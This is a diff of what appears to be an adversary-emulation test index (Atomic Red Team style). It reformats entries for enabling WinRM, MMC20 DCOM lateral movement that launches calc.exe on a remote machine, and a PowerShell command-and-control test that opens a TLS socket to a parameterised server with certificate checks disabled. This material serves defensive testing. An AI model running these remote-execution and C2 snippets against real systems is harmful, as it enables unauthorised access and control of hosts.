@@ -25322,8 +25322,10 @@ execution:
       identifier: T1028
     atomic_tests:
     - name: Enable Windows Remote Management
-      description: "Powershell Enable WinRM\n\nUpon successful execution, powershell
-        will \"Enable-PSRemoting\" allowing for remote PS access. \n"
+      description: |
+        Powershell Enable WinRM
+
+        Upon successful execution, powershell will "Enable-PSRemoting" allowing for remote PS access.
       supported_platforms:
       - windows
       executor:
@@ -25333,8 +25335,14 @@ execution:
 
 '
     - name: PowerShell Lateral Movement
-      description: "Powershell lateral movement using the mmc20 application com object.\n\nReference:\n\nhttps://blog.cobaltstrike.com/2017/01/24/scripting-matt-nelsons-mmc20-application-lateral-movement-technique/\n\nUpon
-        successful execution, cmd will spawn calc.exe on a remote computer. \n"
+      description: |
+        Powershell lateral movement using the mmc20 application com object.
+
+        Reference:
+
+        https://blog.cobaltstrike.com/2017/01/24/scripting-matt-nelsons-mmc20-application-lateral-movement-technique/
+
+        Upon successful execution, cmd will spawn calc.exe on a remote computer.
       supported_platforms:
       - windows
       input_arguments:
@@ -25343,8 +25351,8 @@ execution:
           type: string
           default: computer1
       executor:
-        name: command_prompt
-        command: 'powershell.exe [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.application","#{computer_name}")).Documnet.ActiveView.ExecuteShellCommand("c:\windows\system32\calc.exe",
+        name: powershell
+        command: '[activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.application","#{computer_name}")).Documnet.ActiveView.ExecuteShellCommand("c:\windows\system32\calc.exe",
           $null, $null, "7")
 
 '
@@ -26822,8 +26830,10 @@ lateral-movement:
       identifier: T1028
     atomic_tests:
     - name: Enable Windows Remote Management
-      description: "Powershell Enable WinRM\n\nUpon successful execution, powershell
-        will \"Enable-PSRemoting\" allowing for remote PS access. \n"
+      description: |
+        Powershell Enable WinRM
+
+        Upon successful execution, powershell will "Enable-PSRemoting" allowing for remote PS access.
       supported_platforms:
       - windows
       executor:
@@ -26833,8 +26843,14 @@ lateral-movement:
 
 '
     - name: PowerShell Lateral Movement
-      description: "Powershell lateral movement using the mmc20 application com object.\n\nReference:\n\nhttps://blog.cobaltstrike.com/2017/01/24/scripting-matt-nelsons-mmc20-application-lateral-movement-technique/\n\nUpon
-        successful execution, cmd will spawn calc.exe on a remote computer. \n"
+      description: |
+        Powershell lateral movement using the mmc20 application com object.
+
+        Reference:
+
+        https://blog.cobaltstrike.com/2017/01/24/scripting-matt-nelsons-mmc20-application-lateral-movement-technique/
+
+        Upon successful execution, cmd will spawn calc.exe on a remote computer.
       supported_platforms:
       - windows
       input_arguments:
@@ -26843,8 +26859,8 @@ lateral-movement:
           type: string
           default: computer1
       executor:
-        name: command_prompt
-        command: 'powershell.exe [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.application","#{computer_name}")).Documnet.ActiveView.ExecuteShellCommand("c:\windows\system32\calc.exe",
+        name: powershell
+        command: '[activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.application","#{computer_name}")).Documnet.ActiveView.ExecuteShellCommand("c:\windows\system32\calc.exe",
           $null, $null, "7")
 
 '
@@ -29309,7 +29325,7 @@ command-and-control:
         command: |
           $server_ip = #{server_ip}
           $server_port = #{server_port}
-          $socket = New-Object Net.Sockets.TcpClient('#{server_ip}', #{server_port})
+          $socket = New-Object Net.Sockets.TcpClient('#{server_ip}', '#{server_port}')
           $stream = $socket.GetStream()
           $sslStream = New-Object System.Net.Security.SslStream($stream,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]))
           $sslStream.AuthenticateAsClient('fake.domain', $null, "Tls12", $false)
